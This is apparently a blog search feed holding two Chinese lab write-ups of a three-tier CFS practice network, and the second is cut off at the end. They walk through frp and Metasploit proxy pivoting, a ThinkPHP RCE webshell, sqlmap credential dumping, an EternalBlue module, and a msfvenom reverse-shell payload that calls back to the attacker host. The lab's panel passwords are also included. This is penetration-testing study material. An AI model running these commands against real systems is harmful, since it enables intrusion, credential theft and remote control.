<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>frp--CFS三层靶场渗透</title>
      <link href="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/"/>
      <url>/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="frp代理转发"><a href="#frp代理转发" class="headerlink" title="frp代理转发"></a>frp代理转发</h2><p>frp存在服务端（frps）与客户端（frpc）， frps需要一直保持运行，转发方式通过客户端配置文件进行确定</p><h3 id="一级代理"><a href="#一级代理" class="headerlink" title="一级代理"></a>一级代理</h3><p><strong>配置服务端</strong></p><p>在服务端上传frp, 并配置frps.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0   <span class="comment">#服务端监听地址 默认0.0.0.0</span></span><br><span class="line">bind_port = 7000    <span class="comment">#服务端监听端口</span></span><br></pre></td></tr></table></figure><p>启动服务端, 执行命令开启frps等待连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p><strong>配置客户端</strong>(受控的靶机, 也就是拿到shell的target1)</p><p>在客户端上传frp, 并配置frpc.ini<br>(也就是上传frpc 和 frpc.ini)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.1.129  <span class="comment"># 指向frp服务端绑定的ip, 也就是攻击机kali</span></span><br><span class="line">server_port = 7000           <span class="comment"># 指向frp服务端绑定的端口</span></span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1080           <span class="comment"># 代理所使用的端口，会被转发到服务端</span></span><br><span class="line">plugin = socks5              <span class="comment"># 代理的类型</span></span><br></pre></td></tr></table></figure><p>启动客户端</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frpc</span><br><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure><h3 id="二级代理"><a href="#二级代理" class="headerlink" title="二级代理"></a>二级代理</h3><p>kali 的 1 网段通过代理连接到 <code>target1</code> 的22 网段, 现在需要通过通过kali的1网段, 连接到 <code>target2</code> 的33网段<br>那么就弄一个<code>target1</code>的 22网段 到<code>target2</code> 的33网段的代理<br>这样就实现了 kali的1网段 代理到target2 的33网段</p><p><strong>kali的服务端依旧</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0   # 在服务端上绑定的ip</span><br><span class="line">bind_port = 7000      # 在服务端上绑定的端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p><strong>target1的客户端</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">tls_enable = true</span><br><span class="line">server_addr = 192.168.1.129    # kali的frp服务端绑定的ip</span><br><span class="line">server_port = 7000             # kali的frp服务端绑定的端口</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp                     # 所使用的协议类型</span><br><span class="line">remote_port = 1080             # 要转发到的远程端口</span><br><span class="line"># plugin = socks5  不能加上这个</span><br><span class="line"># 相较于一级代理增加的配置</span><br><span class="line">local_ip = 192.168.22.128      # 本地监听的ip地址（本地的ip）</span><br><span class="line">local_port = 10808             # 要转发的本地端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure><p><strong>target1的服务端frps.ini</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.22.128   # target1上本地ip</span><br><span class="line">bind_port = 7000             # target1的frp服务端绑定的端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p><strong>target2的客户端frpc.ini</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.22.128  # 指向target1的服务端绑定的ip</span><br><span class="line">server_port = 7000            # 指向target1的服务端绑定的端口</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 10808</span><br><span class="line">plugin = socks5       # 代理的类型</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure><h2 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击机kali: 192.168.1.129</span><br><span class="line">Targ1 CentOS: 192.168.1.128   192.168.22.128</span><br><span class="line">Targ2 Ubuntu: 192.168.22.129  192.168.33.128 </span><br><span class="line">Targ3 Windows: 192.168.33.33</span><br></pre></td></tr></table></figure><p>主要是为了学习一下frp的代理, 所以比较简单</p><h2 id="target1"><a href="#target1" class="headerlink" title="target1"></a>target1</h2><p>访问80端口, tp5框架, 工具直接梭, getshell</p><p>蚁剑连接, 查看一下网络, 可以看到 22网段</p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917152041531.png" alt="image-20240917152041531"></p><p>利用frp进行代理转发</p><p>在kali攻击机上启动 服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">Bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917152959858.png" alt="image-20240917152959858"></p><p>启动客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.1.130</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1080</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917153315401.png" alt="image-20240917153315401"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x frpc</span><br><span class="line">./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure><p>可以看到服务端(kali)  显示连接成功</p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917153752042.png" alt="image-20240917153752042"></p><p>现在已经在kali和target1之间搭建了一个SOCKS5代理服务</p><p>接下来就可以借助第三方工具，可以让计算机的其他应用使用这个socks5代理</p><p>比如sockscap , proxifier 或者linux上面的proxychains等</p><p>windows上面配置sockscap<br><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917154444826.png" alt="image-20240917154444826"></p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917154459531.png" alt="image-20240917154459531"></p><p>现在就可以直接访问到   <code> http://192.168.22.129/</code></p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917155038894.png" alt="image-20240917155038894"></p><p>在kali上面使用proxychains,  编辑&#x2F;etc&#x2F;proxychains.conf , 将socks5代理服务器的地址指向frp服务端的地址</p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917155230028.png" alt="image-20240917155230028"></p><p>执行命令在前面加上<code>proxychains</code> 便可以应用此socks5代理</p><p>然后浏览器上配置一下代理, kali的浏览器也可以访问到target2的网站了</p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917154733911.png" alt="image-20240917154733911"></p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917155444192.png" alt="image-20240917155444192"></p><h2 id="target2"><a href="#target2" class="headerlink" title="target2"></a>target2</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap 192.168.22.0/24   扫描一下具体的ip地址</span><br><span class="line">proxychains4 nmap -Pn -sT 192.168.22.129  扫描一下开放的端口</span><br></pre></td></tr></table></figure><p>访问80端口是给了提示进行sql注入</p><p>sqlmap跑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; --dbs</span><br><span class="line">proxychains4 sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -D bagecms --tables</span><br><span class="line">proxychains4 sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -D bagecms -T bage_admin --columns</span><br><span class="line">proxychains4 sqlmap -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -D bagecms -T bage_admin -C username,password --dump</span><br></pre></td></tr></table></figure><p>速度很快的就可以跑出来, 之前使用msf进行代理 跑sqlmap根本跑不出来</p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917161429606.png" alt="image-20240917161429606"></p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917161810705.png" alt="image-20240917161810705"></p><p>有了账号密码登录后台, 在模板里面写入一句话木马, 然后蚁剑连接, </p><p>sockscap里面配置好了代理, 把蚁剑的程序加上去, 就可以使用代理了</p><p>可以发现到33网段</p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917162448076.png" alt="image-20240917162448076"></p><p>进行一个二级代理, 将33网段连接到kali的1网段</p><p>kali</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>target1客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">tls_enable = true</span><br><span class="line">server_addr = 192.168.1.129</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5_forward]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1080</span><br><span class="line">local_ip = 192.168.22.128</span><br><span class="line">local_port = 10808</span><br></pre></td></tr></table></figure><p>target1服务端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 192.168.22.128</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>target2 客户端</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.22.128</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 10808</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali--&gt;    ./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line">target1--&gt; ./frpc -c ./frpc.ini</span><br><span class="line">target1--&gt; ./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line">target2--&gt; ./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure><p>开始这样做的时候一直 显示是这个连接, 按理应该是连接到 <code>[socks5]</code>,<br>而且<code>proxychains nmap -Pn -sT 192.168.33.33</code>扫描端口也扫不出, 都是没反应的, 显然是没能成功的代理到33网段</p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917205952931.png" alt="image-20240917205952931"></p><p>卡了好久, 后面就尝试先让 target1 连上 target2 , 然后再kali连target1, </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target1 --&gt; ./frps -c ./frps.ini</span><br><span class="line">target2 --&gt; ./frpc -c ./frpc.ini</span><br><span class="line"></span><br><span class="line">kali --&gt;    ./frps -c ./frps.ini</span><br><span class="line">target1 --&gt; ./frpc -c ./frpc.ini</span><br></pre></td></tr></table></figure><p>测试扫描一下端口, 有反应, 说明连上了 (也有点懵, 不知道为什么之前那样连不上, 看其他人的博客是那样连上去的啊)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.33.33</span><br></pre></td></tr></table></figure><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917205556773.png" alt="image-20240917205556773"></p><h2 id="target3"><a href="#target3" class="headerlink" title="target3"></a>target3</h2><p>用proxychains 打开msf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains msfconsole</span><br></pre></td></tr></table></figure><p>打永恒之蓝正向连接的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line">set payload windows/meterpreter/bind_tcp</span><br><span class="line">set RHOST 192.168.33.33</span><br><span class="line">options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>可以打通</p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917210912603.png"></p><p>在<code>meterpreter</code>终端 倒是可以执行一下命令啥的, 但是输入 <code>shell</code> 好像进不去shell, 不太稳定还是干嘛</p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917212025790.png" alt="image-20240917212025790"></p><p><img src="/2024/09/17/frp--CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240917212121553.png" alt="image-20240917212121553"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">还有点奇怪的是不知道为什么kali的地址莫名奇妙的变成了 192.168.1.129, 但是之前的kali的地址是 192.168.1.130</span><br><span class="line">所以 proxychains配置文件里面的地址还写的是 192.168.1.130 也能打出来, 将地址改成了192.168.1.129, 也是一样的结果, 也没啥变化, 有点不理解</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">参考文章:</span><br><span class="line">https://thnpkm.github.io/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BAfrp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CFS三层靶机渗透--msf</title>
      <link href="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/"/>
      <url>/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶场下载可以看这篇文章:</span><br><span class="line">https://www.cnblogs.com/b1nn/p/17802909.html</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过攻击机kali192.168.1.xx攻击target1 的192.168.76.148，target2和target3不能连接外网，只能再内网进行通信。所以得先渗透target1，然后通过他的22网卡去攻击target2，然后通过target2做跳板来攻击target3</span><br></pre></td></tr></table></figure><p>新增三张网卡 , 导入到三张虚拟机中</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916142547393.png" alt="image-20240916142547393"></p><p>target1加网卡0和1, </p><p>target2加网卡 0, 2,3 (加上网卡0是为了方便kali配置宝塔, 配置完后需要删除网卡0)</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916151222429.png" alt="image-20240916151222429"></p><p>target3加网卡3</p><p>登录到target1, 查看ip, 确保Target1一个在192.168.1.0网段、另一个在192.168.22.0网段<br><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916144041629.png" alt="image-20240916144041629"></p><p>确保Target2在192.168.1.0、192.168.22.0、192.168.33.0网段</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916151537602.png" alt="image-20240916151537602"></p><p>确保Target3在192.168.33.0网段</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916145645272.png" alt="image-20240916145645272"></p><p>确保kali在192.168.1.0网段</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916145755688.png" alt="image-20240916145755688"></p><p>登录到target1的宝塔</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.128:8888/a768f109/</span><br><span class="line">192.168.1.128--&gt;自己靶机的ip</span><br><span class="line">账号：eaj3yhsl</span><br><span class="line">密码：41bb8fee</span><br></pre></td></tr></table></figure><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916150827469.png" alt="image-20240916150827469"></p><p>登录到target2的宝塔</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">地址：http://你的IP:8888/2cc52ec0/</span><br><span class="line">http://192.168.1.131:8888/2cc52ec0/</span><br><span class="line">账号：xdynr37d</span><br><span class="line">密码：123qwe..</span><br></pre></td></tr></table></figure><p>根据你Target2的22网段IP修改</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916152041462.png" alt="image-20240916152041462"></p><p>设置完成后, 删除target2的网卡0, 没有了192.168.1.0网段</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916152301722.png" alt="image-20240916152301722"></p><p>环境配置就结束了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击机kali: 192.168.1.130</span><br><span class="line">Targ1 CentOS: 192.168.1.128   192.168.22.128</span><br><span class="line">Targ2 Ubuntu: 192.168.22.129  192.168.33.128 </span><br><span class="line">Targ3 Windows: 192.168.33.33</span><br></pre></td></tr></table></figure><h3 id="target1"><a href="#target1" class="headerlink" title="target1"></a>target1</h3><p>kali里面namp扫描一下, 信息搜集</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -v -A 192.168.1.128</span><br></pre></td></tr></table></figure><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916153225528.png" alt="image-20240916153225528"></p><p>访问80端口 , tp5的框架</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916153312626.png" alt="image-20240916153312626"></p><p>使用工具扫描一下, 存在一些rce漏洞</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916153518476.png" alt="image-20240916153518476"></p><p>可以成功利用</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916153818304.png" alt="image-20240916153818304"></p><p>getshell一下, 然后蚁剑连接</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916153956724.png" alt="image-20240916153956724"></p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916154003732.png" alt="image-20240916154003732"></p><p>robots.txt和flag文件里面存在flag, 根目录下也存在一个flag.txt</p><p>当前用户权限低, 需要提权, </p><p>接下来就反弹shell, 在msf生成一个linux马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=4444 -f elf&gt;1.elf</span><br></pre></td></tr></table></figure><p>生成完马先让msf监听本地的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.1.129</span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>将生成的1.elf文件上传到蚁剑的 &#x2F;tmp目录下</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916160318208.png" alt="image-20240916160318208"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x 1.elf  <span class="comment">#添加权限</span></span><br><span class="line">./1.elf   <span class="comment">#然后执行</span></span><br></pre></td></tr></table></figure><p>成功接受到会话</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916160940802.png" alt="image-20240916160940802"></p><p>进行信息搜集<br>获取网络接口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets</span><br></pre></td></tr></table></figure><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916161145599.png" alt="image-20240916161145599"></p><p>可以发现一个22网段, 我们现在是在1网段, 想要访问到22网段</p><p>msf和cs都有代理集成功能，利用到这些功能设置.<br>添加路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br></pre></td></tr></table></figure><p>查看路由表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p</span><br></pre></td></tr></table></figure><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916161558437.png" alt="image-20240916161558437"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">现在的会话是session1，是建立在Target1的shell上的，建立路由后可以和22网段进行通信。那么我们想要通过session1用工具去攻击22网段，这个时候该怎么办呢？</span><br><span class="line"></span><br><span class="line">为了解决这种情况，我们可以在本地(msf上有模块可以开代理)开一个代理，通过这个代理给其他人一个端口去连接，然后我们就可以用自己的本机(自己的电脑，不是攻击机kali)去连接kali的端口，这样就能访问192.168.22.129了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background   --&gt;  如果想在MSF终端中执行其他任务，可以使用background命令将meterpreter终端隐藏在后台</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set SRVHOST 0.0.0.0</span><br><span class="line">set SRVPORT 1080</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916163106564.png" alt="image-20240916163106564"></p><p>在linux系统下，可以利用本地的代理接口进行访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916165014596.png" alt="image-20240916165014596"></p><p>然后用代理文件进行扫描 22网段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap 192.168.22.0/24</span><br></pre></td></tr></table></figure><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916170110745.png" alt="image-20240916170110745"></p><p>128是target1的, 那么128就是target2的<br>扫描一下129的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -Pn -sT 192.168.22.129</span><br></pre></td></tr></table></figure><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916170317310.png" alt="image-20240916170317310"></p><h3 id="target2"><a href="#target2" class="headerlink" title="target2"></a>target2</h3><p>扫描到了80端口, 想要在浏览器中访问还需要设置一下</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916171251586.png" alt="image-20240916171251586"></p><p>然后就可以访问了</p><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916171333933.png" alt="image-20240916171333933"></p><p>扫描一下目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 dirsearch -u http://192.168.22.129/</span><br></pre></td></tr></table></figure><p><img src="/2024/09/16/CFS%E4%B8%89%E5%B1%82%E6%B8%97%E9%80%8F/image-20240916171838815.png" 